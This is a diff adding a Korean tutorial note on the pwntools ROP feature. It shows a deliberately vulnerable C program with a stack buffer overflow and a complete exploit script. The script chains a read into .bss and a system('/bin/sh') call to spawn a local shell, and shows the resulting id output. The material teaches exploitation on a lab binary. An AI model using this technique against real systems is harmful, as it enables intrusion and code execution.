@@ -1,0 +1,100 @@
+pwntools - ROP :
+    ROP는 코드 가젯을 연결해서 실행하려는 코드를 작성해주는 기능입니다.
+    해당 기능을 이용하면 쉽게 ROP 코드를 작성할 수 있습니다. 
+    ROP는 각각의 아키텍처마다 호출 규약이 다르기 때문에 context.arch를 사용하여 공격하는 바이너리의 아키텍처를 명시해야 합니다.
+
+
+    rop_pwn.c는 스택 버퍼 오버플로우가 발생하고 system 함수를 사용했습니다.
+    ex)
+        // gcc -o rop_pwn rop_pwn.c -fno-stack-protector 
+        #include <stdio.h>
+        #include <unistd.h>
+        #include <stdlib.h>
+        void gadget() {
+            asm("pop %rdi");
+            asm("pop %rsi");
+            asm("pop %rdx");
+            asm("ret");
+        }
+        int main()
+        {
+            char buf[256];
+            read(0, buf ,1024);
+            system("clear");
+            return 0;
+        }
+
+    64비트 ROP를 하기위해 rdi,rsi,rdx 레지스터를 조작할 수 있는 함수 또한 존재합니다.
+
+    ROP 기능을 사용해서 셸을 획득하기 위해서는 바이너리의 정보를 가져와야 하기 때문에 ELF 함수 또한 필요합니다.
+    ex)
+        elf = ELF('./rop_pwn')
+        rop = ROP(elf)
+
+    rop 변수에 ROP 클래스의 객체가 리턴되었습니다.
+
+    다음은 read 함수의 ROP 코드를 작성하는 코드입니다.
+    ex)
+        rop.read(0,elf.bss(),100)
+        print rop.dump()
+        0x0000:         0x40056a pop rdi; pop rsi; pop rdx; ret
+        0x0008:              0x0 [arg0] rdi = 0
+        0x0010:         0x601040 [arg1] rsi = 6295616
+        0x0018:             0x64 [arg2] rdx = 100
+        0x0020:         0x400440 read
+
+    gadget 함수에 존재하는 pop rdi; pop rsi; pop rdx; ret 가젯을 가져와 함수의 인자를 설정하고 read 함수를 호출하는 ROP 코드가 작성되었습니다. 
+    작성된 ROP 코드는 다음과 같이 볼 수 있습니다.
+    ex)
+        print `str(rop)`
+        'j\x05@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x10`\x00\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00@\x04@\x00\x00\x00\x00\x00'
+
+    rop_pwn.py는 bss 섹션에 "/bin/sh" 문자열을 입력하고 system 함수 인자에 bss 섹션 주소를 전달하여 호출하는 코드입니다.
+    ex)
+        # python rop_pwn.py
+        from pwn import *
+        
+        context.arch = 'x86_64'
+        p = process("./rop_pwn")
+        
+        elf = ELF('./rop_pwn')
+        rop = ROP(elf)
+        
+        binsh = "/bin/sh\x00"
+        
+        rop.read(0, elf.bss(), len(binsh))
+        rop.system(elf.bss())
+        
+        payload = "A"*264
+        payload += str(rop)
+        
+        p.send(payload)
+        p.send(binsh)
+        p.interactive()
+
+    ex)
+        $ id
+        uid=1001(theori) gid=1001(theori) groups=1001(theori)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
